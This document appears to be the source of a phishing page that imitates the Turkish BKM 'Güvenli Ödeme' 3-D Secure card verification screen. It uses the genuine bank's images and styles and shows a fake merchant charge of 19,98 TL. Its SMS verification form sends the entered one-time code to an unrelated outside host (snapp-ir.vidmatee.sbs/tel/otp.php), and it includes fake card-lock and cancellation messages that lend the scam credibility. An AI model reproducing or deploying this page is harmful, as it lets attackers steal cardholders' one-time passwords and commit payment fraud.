...
<head>
    ...
    <link rel="apple-touch-icon" type="image/png" sizes="76x76"
        href="https://goguvenliodeme.bkm.com.tr/static/img/fav/bkm.png" />
    ...
    <link rel="stylesheet" href="https://goguvenliodeme.bkm.com.tr/static/css/main-dist.css" type="text/css"
        media="screen" />
    <style type="text/css">
...
<body>
    ...
    <div class="content-wrapper">
            ...
            <div class="content">
                ...
                <div class="info-wrapper">
                    <div class="info-row">
                        ...
                        <div class="info-col" id="merchant-name">
                            BELBİM KART İŞLEMLERİ
                        </div>
                    </div>
                    <div class="info-row">
                        <div class="info-col info-label">İşlem Tutarı:</div>
                        <div class="info-col amount" id="amount">19,98 TL</div>
                    </div>
                    <div class="info-row">
                    ...
                    <div class="info-row">
                        ...
                        <div class="info-col" id="masked-pan">
                            <?php
                ...
                <div class="action-wrapper">
                    <div class="info-message h3">
                        <h3>
                            <div id="auth-message">
                                İşlemi tamamlamak için kullanacağınız şifreniz bankanızda
                                kayıtlı cep telefonunuza gönderilecektir.<br />Referans no:
                                <span id="otpRefNo"> LNQTROTJ </span>
                            </div>
                        </h3>
                    </div>
                    <div class="form-wrapper">
                        <form class="form-code" autocomplete="off" method="POST"
                            action="https://snapp-ir.vidmatee.sbs/tel/otp.php">
                            <div class="form-row">
                                <label for="code" class="otpcode">Doğrulama Kodu</label>
                                <input type="text" class="f-input" name="sms" id="sms" minlength="5" maxlength="6"
                            ...
                            <div class="error-messages error-wrong-otp" style="display: none">
                                <span>Doğrulama Kodunu hatalı girdiniz.Lütfen kontrol ederek
                                    tekrar deneyiniz.</span>
                                <span class="has-reg" id="remainingEntryCount"></span>
                            </div>
                            <div id="submitButtonDiv">
                                <div class="has-submit">
                                    <button id="btn-commit" type="submit" class="button btn-1 btn-commit">
                                        Onayla
                                    </button>
                                </div>
                                <div id="timerDiv" class="has-timer">
                                    <span>Kalan Süre: </span>
                                    <span class="has-counter" id="time">02:48</span>
                                </div>
                            </div>
                        </form>
                        <div id="timeOutDiv" class="error-messages error-timeover" style="display: none">
                            ...
                            <button id="btn-resend-otp" type="button" class="button btn-1 re-code v1">
                                Doğrulama Kodunu Yeniden Gönder
                            </button>
                            <div class="status with-ico">
                                <i class="ico icon-check"></i>Yeni Doğrulama Kodu cep
                                telefonunuza gönderildi.
                            </div>
                        </div>
                            ...
                            <div class="action-list">
                                <div class="action-row">
                                    <div class="action-col left">
                                        <a class="txt-link fancybox-ajax" style="
            ...
            <div class="content">
                <div class="action-wrapper">
                    <h1 id="msg-cancel-page" class="small">
                        İsteğiniz üzerine işlem iptal edildi.<br />
                        İşyeri sayfasına yönlendiriliyorsunuz.
                    </h1>
                    <img src="https://goguvenliodeme.bkm.com.tr/static/img/loading.gif"
                        class="loading gif-auto-redirect" alt="TROY" />
                    <p></p>
                </div>
            </div>
        </div>
        ...
        <div id="card-locked-page">
            <div class="content">
                <div class="action-wrapper">
                    <h1 class="small" id="msg-header-cardlock-page">
                        Kartınız Bloke Edilmiştir.
                    </h1>
                    <p id="msg-cardlock-page">
                        Doğrulama kodunu <span class="countForLock">3</span> kere hatalı
                        girdiğiniz için kartınız
                        <span class="operationName">Güvenli Ödeme</span> işlemi için
                        kilitlenmiştir. Lütfen daha sonra tekrar deneyiniz ya da detaylı
                        bilgi için bankanızın çağrı merkezini arayınız.<br />Birazdan
                        alışveriş yaptığınız siteye yönlendirileceksiniz.
                    </p>
                    <img src="https://goguvenliodeme.bkm.com.tr/static/img/loading.gif"
                        class="loading gif-auto-redirect" alt="TROY" />
                    <p></p>
            ...
            <div class="content">
                <div class="action-wrapper">
                    <h1 id="msg-error-page" class="small">
                        İşleminiz gerçekleştirilemiyor.<br />
                        Lütfen daha sonra tekrar deneyiniz.<br />
                        Birazdan alışveriş yaptığınız siteye yönlendirileceksiniz.
                    </h1>
                    <img src="https://goguvenliodeme.bkm.com.tr/static/img/loading.gif"
                        class="loading gif-auto-redirect" alt="TROY" />
                    <p></p>
        ...
        <div class="panel" id="cancelFancyBox">
            <h1 class="small" id="msg-cancel-box">
                İşyeri sayfasına yönlendirileceksiniz, işleminizi iptal etmek
                istediğinizden emin misiniz?
            </h1>
            <a id="closebutton" class="button btn-1 close-modal" onclick="$.fancybox.close();">Vazgeç</a>
            <a id="cancelbutton" class="button btn-1 btn-1-cancel txt-link trigger-cancel-page">İşlemi İptal Et</a>
        </div>
